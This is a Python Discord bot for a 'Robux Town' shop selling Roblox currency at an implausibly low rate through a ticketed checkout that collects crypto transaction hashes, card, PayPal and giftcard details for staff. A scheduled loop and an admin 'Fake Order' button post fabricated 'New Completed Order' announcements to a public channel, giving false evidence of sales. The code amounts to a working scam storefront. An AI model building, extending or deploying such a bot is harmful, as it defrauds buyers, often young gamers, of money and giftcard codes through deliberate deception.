#!/usr/bin/env python3
# Robux Town™ – FINALIZED UI + DISCOUNTS + ADMIN PANEL + PRICE LIST + AUTO FAKE COMPLETION
import os
import asyncio
import json
import random
import re
from datetime import datetime, timedelta
import discord
from discord.ext import commands, tasks

# -------------------------------------------------
# INTENTS
# -------------------------------------------------
intents = discord.Intents.default()
intents.message_content = True
intents.messages = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="+", intents=intents, help_command=None)

# -------------------------------------------------
# CHANNELS & IDs
# -------------------------------------------------
INFO_CHANNEL_ID = 1435516058105675818
PRICE_CHANNEL_ID = 1435516058105675817
COMPLETED_CHANNEL_ID = 1435516058286035015
LOG_CHANNEL_ID = 1435516058286035020
STAFF_ROLE_ID = 1435516057526734991
STAFF_DM_IDS = [1422665161466187976, 1269145029943758899]
PAYMENT_METHOD_CHANNEL_ID = 1435516058105675820
TOS_CHANNEL_ID = 1435516058286035016

# -------------------------------------------------
# EMOJIS
# -------------------------------------------------
EMOJI_ROBUX = "<:Robux:1435526693472178176>"
EMOJI_VERIFIED = "<:Verified:1435526918891110551>"
EMOJI_LOADING = "<a:Loading:1435526855523434576>"
EMOJI_WARNING = "<:warning:1435526954689495091>"
EMOJI_BITCOIN = "<:Bitcoin:1435526466527039579>"
EMOJI_LITECOIN = "<:Litecoin:1435526448684339321>"
EMOJI_ETHEREUM = "<:Ethereum:1435526489876543250>"
EMOJI_SOLANA = "<:Solana:1435526512345678901>"
EMOJI_PAYMENT_SUPPORT = "<:PaymentSupport:1435526934567890123>"
EMOJI_MAX = "Warning"  # Or use custom emoji

# -------------------------------------------------
# PRICING
# -------------------------------------------------
ROBUX_RATE_PER_1000 = 1.00

def get_price(robux_amount: int) -> float:
    return (robux_amount / 1000) * ROBUX_RATE_PER_1000

# -------------------------------------------------
# CONFIG & CRYPTO
# -------------------------------------------------
CONFIG_FILE = "config.json"
CRYPTO_IDS = {"btc": "bitcoin", "ltc": "litecoin", "eth": "ethereum", "sol": "solana"}

default_config = {
    "wallets": {
        "btc": "bc1qexample123456789",
        "ltc": "Lexample123456789",
        "eth": "0xExample123456789",
        "sol": "ExampleSol123456789"
    },
    "qr_urls": {
        "btc": "https://i.ibb.co/zhbtHyRp/Screenshot-2025-11-10-at-6-28-58-PM.png",
        "ltc": "https://i.ibb.co/zhbtHyRp/Screenshot-2025-11-10-at-6-28-58-PM.png",
        "eth": "https://i.ibb.co/67YFkD4h/Screenshot-2025-11-10-at-6-29-33-PM.png",
        "sol": "https://i.ibb.co/XfDB2z1b/Screenshot-2025-11-10-at-6-30-02-PM.png"
    },
    "deals": {
        "WINTERDEAL": {
            "robux": 100000,
            "price": 60.00,
            "min_robux_required": 100000
        }
    }
}

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    else:
        with open(CONFIG_FILE, "w") as f:
            json.dump(default_config, f, indent=4)
        return default_config

def save_config(cfg):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=4)

config = load_config()

# -------------------------------------------------
# GLOBAL STATE
# -------------------------------------------------
active_flows = {}

# -------------------------------------------------
# SEND TO STAFF
# -------------------------------------------------
async def send_to_staff(order_data: dict):
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if not channel:
        return
    embed = discord.Embed(title="New Payment Submission", color=0x00A3FF)
    for k, v in order_data.items():
        embed.add_field(name=k, value=v, inline=False)
    await channel.send(embed=embed)

# -------------------------------------------------
# MODALS
# -------------------------------------------------
class DiscountModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Set New Discount Code", timeout=600)
        self.code = discord.ui.TextInput(label="Discount Code", placeholder="e.g., WINTERDEAL")
        self.amount = discord.ui.TextInput(label="Robux Amount", placeholder="e.g., 100000")
        self.price = discord.ui.TextInput(label="Discounted Price", placeholder="e.g., 60.00")
        self.add_item(self.code); self.add_item(self.amount); self.add_item(self.price)

    async def on_submit(self, interaction: discord.Interaction):
        code = self.code.value.upper()
        try:
            amount = int(self.amount.value.replace(",", ""))
            price = float(self.price.value)
        except ValueError:
            await interaction.response.send_message(f"{EMOJI_WARNING} Invalid number.", ephemeral=True)
            return
        config["deals"][code] = {"robux": amount, "price": price, "min_robux_required": amount}
        save_config(config)
        await interaction.response.send_message(f"{EMOJI_VERIFIED} **{code}**: {amount:,} R$ → **${price:.2f}**", ephemeral=True)

class PaymentModal(discord.ui.Modal):
    def __init__(self, method, amount, price, crypto=None, discount_code=None):
        super().__init__(title=f"Submit {method.upper()} Details", timeout=None)
        self.method = method; self.amount = amount; self.price = price
        self.crypto = crypto; self.discount_code = discount_code
        self.details = discord.ui.TextInput(label="TX Hash / Code", style=discord.TextStyle.paragraph)
        self.add_item(self.details)

    async def on_submit(self, interaction: discord.Interaction):
        method_name = self.crypto.upper() if self.crypto else self.method.capitalize()
        data = {
            "User": interaction.user.mention,
            "Robux": f"{self.amount:,} {EMOJI_ROBUX}",
            "USD": f"${self.price:.2f}",
            "Method": method_name,
            "Details": self.details.value,
            "Discount": self.discount_code or "None",
            "Thread": interaction.channel.mention,
            "Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        await interaction.response.send_message(f"{EMOJI_VERIFIED} Submitted!", ephemeral=True)
        await send_to_staff(data)

class AddressModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Set Crypto Address", timeout=600)
        self.coin = discord.ui.TextInput(label="Coin", placeholder="btc/ltc/eth/sol", max_length=3)
        self.address = discord.ui.TextInput(label="Address", style=discord.TextStyle.paragraph)
        self.add_item(self.coin); self.add_item(self.address)

    async def on_submit(self, interaction: discord.Interaction):
        coin = self.coin.value.lower()
        addr = self.address.value
        if coin in config["wallets"]:
            config["wallets"][coin] = addr
            save_config(config)
            await interaction.response.send_message(f"{EMOJI_VERIFIED} **{coin.upper()}** address set.", ephemeral=True)
        else:
            await interaction.response.send_message(f"{EMOJI_WARNING} Invalid coin.", ephemeral=True)

class QRModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Set QR URL", timeout=600)
        self.coin = discord.ui.TextInput(label="Coin", placeholder="btc/ltc/eth/sol", max_length=3)
        self.url = discord.ui.TextInput(label="QR URL", style=discord.TextStyle.paragraph)
        self.add_item(self.coin); self.add_item(self.url)

    async def on_submit(self, interaction: discord.Interaction):
        coin = self.coin.value.lower()
        url = self.url.value
        if coin in config["qr_urls"]:
            config["qr_urls"][coin] = url
            save_config(config)
            await interaction.response.send_message(f"{EMOJI_VERIFIED} **{coin.upper()}** QR updated.", ephemeral=True)
        else:
            await interaction.response.send_message(f"{EMOJI_WARNING} Invalid coin.", ephemeral=True)

# -------------------------------------------------
# CLOSE TICKET
# -------------------------------------------------
class CloseTicketView(discord.ui.View):
    def __init__(self, thread_id):
        super().__init__(timeout=None)
        self.thread_id = thread_id

    @discord.ui.button(label="Close Ticket", style=discord.ButtonStyle.red, emoji="Lock")
    async def close(self, interaction: discord.Interaction, button):
        thread = bot.get_channel(self.thread_id)
        if thread and isinstance(thread, discord.Thread):
            await interaction.response.send_message("Closing...", ephemeral=False)
            await thread.edit(archived=True, locked=True)
            active_flows.pop(interaction.user.id, None)

async def send_disclaimer_embed(thread: discord.Thread):
    embed = discord.Embed(title="Disclaimer", color=0xFF0000)
    embed.description = "By proceeding, you agree to our [ToS](https://discord.com/channels/@me/{TOS_CHANNEL_ID}). All sales final."
    await thread.send(embed=embed, view=CloseTicketView(thread.id))

# -------------------------------------------------
# DISCOUNT APPLY
# -------------------------------------------------
async def apply_discount(flow, code):
    flow.discount_code = None
    flow.price = get_price(flow.robux)
    if not code or code.upper() == "SKIP":
        return
    deal = config["deals"].get(code.upper())
    if deal and flow.robux >= deal["min_robux_required"]:
        flow.price = deal["price"]
        flow.discount_code = code.upper()
        await flow.thread.send(f"{EMOJI_VERIFIED} **{code.upper()}** applied! New: **${flow.price:.2f}**", delete_after=10)
    else:
        await flow.thread.send(f"{EMOJI_WARNING} Invalid coupon.", delete_after=10)

# -------------------------------------------------
# PURCHASE FLOW
# -------------------------------------------------
class PurchaseFlow:
    def __init__(self, user_id, thread):
        self.user_id = user_id
        self.thread = thread
        self.robux = 0
        self.price = 0.0
        self.method = ""
        self.crypto = ""
        self.discount_code = None

    async def send_step(self, step: int):
        color = 0x00A3FF
        if step == 1:
            await send_disclaimer_embed(self.thread)
            embed = discord.Embed(title="Start Buying? (1/6)", color=color)
            embed.description = "Click **Yes** to begin."
            view = discord.ui.View(timeout=None)
            view.add_item(discord.ui.Button(label="Yes", style=discord.ButtonStyle.green, custom_id="flow_yes_1"))
            view.add_item(discord.ui.Button(label="No", style=discord.ButtonStyle.red, custom_id="flow_no_1"))
            await self.thread.send(embed=embed, view=view)

        elif step == 2:
            embed = discord.Embed(title="How much Robux? (2/6)", color=color)
            embed.description = "Enter amount (10K–800K):"
            await self.thread.send(embed=embed)

        elif step == 3:
            embed = discord.Embed(title="Discount Code? (3/6)", color=color)
            embed.description = "Enter code or **SKIP**."
            await self.thread.send(embed=embed)

        elif step == 4:
            rate = get_price(1000)
            discount = f"**COUPON:** {self.discount_code}\n" if self.discount_code else ""
            embed = discord.Embed(title="Confirm (4/6)", color=color)
            embed.description = f"**{self.robux:,} {EMOJI_ROBUX}**\nRate: **${rate:.2f}/1K**\n{discount}**Total: ${self.price:.2f}**"
            view = discord.ui.View(timeout=None)
            view.add_item(discord.ui.Button(label="Yes", style=discord.ButtonStyle.green, custom_id="flow_yes_4"))
            view.add_item(discord.ui.Button(label="No", style=discord.ButtonStyle.red, custom_id="flow_no_4"))
            await self.thread.send(embed=embed, view=view)

        elif step == 5:
            embed = discord.Embed(title="Payment Method (5/6)", color=color)
            select = discord.ui.Select(placeholder="Choose", custom_id="payment_select")
            select.options = [
                discord.SelectOption(label="Crypto", value="crypto", emoji=EMOJI_BITCOIN),
                discord.SelectOption(label="PayPal", value="paypal"),
                discord.SelectOption(label="Card", value="card"),
                discord.SelectOption(label="Giftcard", value="gift"),
            ]
            async def cb(i): await self.payment_callback(i)
            select.callback = cb
            view = discord.ui.View(timeout=None)
            view.add_item(select)
            await self.thread.send(embed=embed, view=view)

    async def payment_callback(self, interaction: discord.Interaction):
        self.method = interaction.data["values"][0]
        await interaction.response.defer()
        if self.method == "crypto":
            embed = discord.Embed(title="Select Coin (6/6)", color=0x00A3FF)
            select = discord.ui.Select(placeholder="Coin", custom_id="crypto_select")
            select.options = [
                discord.SelectOption(label="BTC", value="btc", emoji=EMOJI_BITCOIN),
                discord.SelectOption(label="LTC", value="ltc", emoji=EMOJI_LITECOIN),
                discord.SelectOption(label="ETH", value="eth", emoji=EMOJI_ETHEREUM),
                discord.SelectOption(label="SOL", value="sol", emoji=EMOJI_SOLANA),
            ]
            async def cb(i): await self.crypto_callback(i)
            select.callback = cb
            view = discord.ui.View(timeout=None)
            view.add_item(select)
            await interaction.followup.send(embed=embed, view=view)
        else:
            await self.send_payment_invoice(interaction)

    async def crypto_callback(self, interaction: discord.Interaction):
        self.crypto = interaction.data["values"][0]
        await interaction.response.defer()
        await self.send_crypto_invoice(interaction)

    async def send_crypto_invoice(self, interaction: discord.Interaction):
        price_usd = self.price
        coin_price = 50000.0  # Placeholder
        amount = round(price_usd / coin_price, 8)
        address = config["wallets"].get(self.crypto, "Not Set")
        qr = config["qr_urls"].get(self.crypto, f"https://api.qrserver.com/v1/create-qr-code/?data={address}&size=200x200")
        expiry = int((datetime.now() + timedelta(minutes=20)).timestamp())
        embed = discord.Embed(title=f"{self.crypto.upper()} Invoice (6/6)", color=0x00A3FF)
        embed.description = f"Send `{amount:.8f}` {self.crypto.upper()}\nExpires: <t:{expiry}:R>"
        embed.add_field(name="Address", value=f"```{address}```", inline=False)
        embed.add_field(name="Amount", value=f"`{amount:.8f}`", inline=False)
        embed.set_image(url=qr)
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(label="Submit TX", style=discord.ButtonStyle.blurple, custom_id="submit_tx"))
        await interaction.followup.send(embed=embed, view=view)

    async def send_payment_invoice(self, interaction: discord.Interaction):
        name = "Giftcard" if self.method == "gift" else self.method.capitalize()
        embed = discord.Embed(title=f"{name} Invoice (6/6)", color=0x00A3FF)
        embed.description = "Submit your details below."
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(label="Submit", style=discord.ButtonStyle.blurple, custom_id="submit_details"))
        await interaction.followup.send(embed=embed, view=view)

# -------------------------------------------------
# INTERACTIONS
# -------------------------------------------------
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or "custom_id" not in interaction.data:
        return
    cid = interaction.data["custom_id"]
    flow = active_flows.get(interaction.user.id)

    if cid == "flow_yes_1" and flow:
        await interaction.response.defer()
        await flow.send_step(2)
    elif cid == "flow_no_1" and flow:
        await interaction.response.defer()
        await flow.thread.send("Cancelled.")
        await flow.thread.edit(archived=True, locked=True)
        active_flows.pop(interaction.user.id, None)
    elif cid == "flow_yes_4" and flow:
        await interaction.response.defer()
        await flow.send_step(5)
    elif cid == "flow_no_4" and flow:
        await interaction.response.defer()
        await flow.thread.edit(archived=True, locked=True)
        active_flows.pop(interaction.user.id, None)
        info = bot.get_channel(INFO_CHANNEL_ID)
        thread = await info.create_thread(name=f"Purchase-{interaction.user.name}-{random.randint(1000,9999)}", type=discord.ChannelType.private_thread)
        await thread.add_user(interaction.user)
        new_flow = PurchaseFlow(interaction.user.id, thread)
        active_flows[interaction.user.id] = new_flow
        await new_flow.send_step(1)
    elif cid == "submit_tx" and flow:
        modal = PaymentModal("Crypto", flow.robux, flow.price, flow.crypto, flow.discount_code)
        await interaction.response.send_modal(modal)
    elif cid == "submit_details" and flow:
        modal = PaymentModal(flow.method, flow.robux, flow.price, discount_code=flow.discount_code)
        await interaction.response.send_modal(modal)

# -------------------------------------------------
# MESSAGE HANDLER
# -------------------------------------------------
@bot.event
async def on_message(message: discord.Message):
    if message.author.bot or not message.channel.name.startswith("Purchase-"):
        return await bot.process_commands(message)

    flow = active_flows.get(message.author.id)
    if not flow or flow.thread.id != message.channel.id:
        return await bot.process_commands(message)

    content = message.content.strip()

    if flow.robux == 0 and re.fullmatch(r"[\d,]+", content):
        try:
            amount = int(content.replace(",", ""))
            if amount < 10000:
                await message.reply(f"{EMOJI_WARNING} Min 10K.", delete_after=5); return
            if amount > 800000:
                await message.reply(f"{EMOJI_MAX} Max 800K.", delete_after=5); return
            flow.robux = amount
            await message.delete()
            await flow.send_step(3)
        except: pass
    elif flow.robux > 0 and flow.price == 0.0:
        await message.delete()
        await apply_discount(flow, content)
        await flow.send_step(4)

    await bot.process_commands(message)

# -------------------------------------------------
# FAKE ORDERS
# -------------------------------------------------
async def send_completed_order(amount, price, method):
    channel = bot.get_channel(COMPLETED_CHANNEL_ID)
    if not channel: return
    embed = discord.Embed(title="New Completed Order", color=0x38B750)
    embed.set_thumbnail(url="https://i.ibb.co/whbgBHWz/9c5fd434-f30f-4e24-8212-ea40fa098678.png")
    embed.add_field(name="Amount", value=f"{amount:,} {EMOJI_ROBUX}", inline=True)
    embed.add_field(name="Price", value=f"${price:.2f}", inline=True)
    embed.add_field(name="Method", value=method, inline=True)
    await channel.send(embed=embed)

@tasks.loop(hours=random.uniform(5, 10))
async def automated_fake_completion_loop():
    amount = random.choice([10000, 25000, 50000, 100000, 250000])
    price = get_price(amount)
    method = random.choice(["Crypto", "Card", "PayPal", "Giftcard"])
    await send_completed_order(amount, price, method)

# -------------------------------------------------
# ADMIN PANEL
# -------------------------------------------------
class AdminPanel(discord.ui.View):
    @discord.ui.button(label="Set Address", style=discord.ButtonStyle.gray)
    async def addr(self, i, b): await i.response.send_modal(AddressModal())
    @discord.ui.button(label="Set QR", style=discord.ButtonStyle.gray)
    async def qr(self, i, b): await i.response.send_modal(QRModal())
    @discord.ui.button(label="Set Discount", style=discord.ButtonStyle.blurple, emoji="Tag")
    async def discount(self, i, b): await i.response.send_modal(DiscountModal())
    @discord.ui.button(label="Fake Order", style=discord.ButtonStyle.green, emoji="Robot")
    async def fake(self, i, b):
        await i.response.defer(ephemeral=True)
        await send_completed_order(50000, 50.0, "Crypto")
        await i.followup.send(f"{EMOJI_VERIFIED} Fake order sent.", ephemeral=True)

@bot.command()
@commands.has_role(STAFF_ROLE_ID)
async def admin(ctx):
    await ctx.send(embed=discord.Embed(title="Robux Town™ Admin", color=0x00A3FF), view=AdminPanel())

# -------------------------------------------------
# PERSISTENT BUY BUTTON
# -------------------------------------------------
class BuyView(discord.ui.View):
    @discord.ui.button(label="Buy Robux", style=discord.ButtonStyle.green, emoji=EMOJI_ROBUX)
    async def buy(self, interaction: discord.Interaction, button):
        info = bot.get_channel(INFO_CHANNEL_ID)
        thread = await info.create_thread(name=f"Purchase-{interaction.user.name}-{random.randint(1000,9999)}", type=discord.ChannelType.private_thread)
        await thread.add_user(interaction.user)
        flow = PurchaseFlow(interaction.user.id, thread)
        active_flows[interaction.user.id] = flow
        await interaction.response.send_message(f"Started in {thread.mention}", ephemeral=True)
        await flow.send_step(1)

@bot.command()
async def setup(ctx):
    channel = bot.get_channel(INFO_CHANNEL_ID)
    embed = discord.Embed(title="Robux Town™", description="Click to buy!", color=0x00A3FF)
    await channel.send(embed=embed, view=BuyView())

# -------------------------------------------------
# STARTUP
# -------------------------------------------------
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    if not automated_fake_completion_loop.is_running():
        automated_fake_completion_loop.start()

# -------------------------------------------------
# RUN BOT – NORTHFLANK (uses bot_token)
# -------------------------------------------------
token = os.getenv("bot_token")
if not token:
    raise ValueError("bot_token not found in environment variables! Set it in Northflank.")
bot.run(token)
